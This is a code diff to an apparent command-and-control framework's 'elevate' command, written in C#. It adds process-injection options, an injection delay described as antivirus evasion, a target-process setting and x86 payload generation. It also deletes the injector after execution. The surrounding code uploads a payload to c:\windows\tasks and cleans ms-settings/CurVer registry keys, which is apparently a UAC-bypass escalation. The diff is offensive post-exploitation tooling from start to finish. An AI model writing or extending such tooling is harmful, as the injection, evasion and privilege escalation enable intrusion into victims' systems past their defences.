@@ -22,6 +22,15 @@ namespace Commander.Commands.Composite
         public string file { get; set; }
         public string path { get; set; }
 
+        public bool inject { get; set; }
+
+        public int? injectDelay { get; set; }
+
+        public string injectProcess { get; set; }
+
+        public bool x86 { get; set; }
+
+
     }
     public class ElevateCommand : CompositeCommand<ElevateCommandOptions>
     {
@@ -36,6 +45,10 @@ namespace Commander.Commands.Composite
              new Option<string>(new[] { "--pipe", "-n" }, () => "local","Name of the pipe used to pivot."),
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows\\tasks","Name of the folder to upload the payload."),
+             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
+             new Option<int?>(new[] { "--injectDelay", "-id" },() => null, "Delay before injection (AV evasion)"),
+             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
+             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
         };
 
         protected override async Task<bool> CreateComposition(CommandContext<ElevateCommandOptions> context)
@@ -47,13 +60,18 @@ namespace Commander.Commands.Composite
 
             var options = new PayloadGenerationOptions()
             {
-                Architecture =  agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
+                Architecture =  context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
                 IsVerbose = context.Options.verbose,
                 ServerKey = context.Config.ServerConfig.Key,
                 Type = PayloadType.Executable,
+                IsInjected = context.Options.inject
             };
+            if (context.Options.injectDelay.HasValue)
+                options.InjectionDelay = context.Options.injectDelay.Value;
+            if (!string.IsNullOrEmpty(context.Options.injectProcess))
+                options.InjectionProcess = context.Options.injectProcess;
 
             context.Terminal.WriteInfo($"[>] Generating Payload!");
             var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
@@ -73,7 +91,7 @@ namespace Commander.Commands.Composite
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
-            string path = Path.Combine(context.Options.path, fileName);
+            string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
             var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
             await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
@@ -94,9 +112,25 @@ namespace Commander.Commands.Composite
             this.Echo($"[>] Cleaning...");
             this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{context.Options.key} -Recurse  -Force -Verbose");
             this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
+            if (!context.Options.inject)
+            {
+                this.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
+            }
+            else
+            {
+                this.Echo($"[>] Waiting {options.InjectionDelay}s to evade antivirus...");
+                this.Delay(options.InjectionDelay + 10);
+                this.Echo($"[>] Removing injector {path}...");
+                this.Shell($"del {path}");
+            }
             this.Echo($"[*] Execution done!");
             this.Echo(Environment.NewLine);
-            this.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
+
+            if (context.Options.inject)
+            {
+                context.Terminal.WriteInfo($"Due to AV evasion, agent can make a couple of minutes to check-in...");
+            }
+
 
             return true;
         }
